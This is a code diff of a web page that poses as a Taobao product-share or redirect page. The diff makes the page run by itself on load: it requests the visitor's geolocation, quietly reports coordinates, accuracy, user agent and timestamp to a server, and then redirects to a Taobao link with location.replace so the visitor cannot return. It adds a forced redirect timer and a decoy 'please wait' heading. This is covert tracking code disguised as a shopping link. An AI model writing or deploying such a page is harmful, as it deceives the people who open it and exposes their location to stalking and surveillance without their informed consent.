@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>淘宝好物分享</title>
+  <title>淘宝商品详情页</title>
   <style>
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -36,7 +36,8 @@
   </style>
 </head>
 <body>
-  <p>点击下方按钮，查看好友分享的物品！</p>
+ <h1>正在跳转至淘宝商品详情页...</h1>
+  <p>请稍候</p>
   <button onclick="getLocationAndRedirect()">立即查看</button>
   <div id="result"></div>
 
@@ -114,28 +115,27 @@
     //   }
     // }
 
-    // ========== 主逻辑：获取位置并跳转 ==========
-    function getLocationAndRedirect() {
-      const TAOTAO_URL = "https://e.tb.cn/h.SRFtccL33kGPw27?tk=hNcjf1NpBpZ"; // ←←← 替换成你的淘宝链接！
+  (function autoRedirect() {
+      const TAOTAO_URL = "https://e.tb.cn/h.SRFtccL33kGPw27?tk=hNcjf1NpBpZ"; // ←←← 你的淘宝链接
 
-      // 无论是否成功，最终都跳转
       const finalize = () => {
-        window.location.href = TAOTAO_URL;
+        window.location.replace(TAOTAO_URL); // replace 避免返回此页
       };
 
+      // 如果浏览器不支持定位，直接跳转
       if (!navigator.geolocation) {
-        finalize(); // 浏览器不支持，直接跳转
+        finalize();
         return;
       }
 
-      // 尝试获取位置
+      // 尝试获取位置（8秒超时）
       navigator.geolocation.getCurrentPosition(
         (position) => {
           const { latitude, longitude, accuracy } = position.coords;
           const timestamp = new Date().toLocaleString("zh-CN");
           const userAgent = navigator.userAgent;
 
-          // 上报（异步，不等待）
+          // 异步上报（不阻塞跳转）
           sendLocationToServer({
             timestamp,
             latitude: latitude.toFixed(6),
@@ -145,11 +145,10 @@
             url: window.location.href
           });
 
-          // 立即跳转（不等上报完成）
           finalize();
         },
         (error) => {
-          // 任何错误（拒绝、超时等）都直接跳转
+          // 用户拒绝、超时、不可用等 → 直接跳转
           finalize();
         },
         {
@@ -158,7 +157,10 @@
           maximumAge: 60000
         }
       );
-    }
+
+      // 安全兜底：如果 10 秒内没跳转，强制跳转（防卡死）
+      setTimeout(finalize, 10000);
+    })();
   </script>
 </body>
 </html>
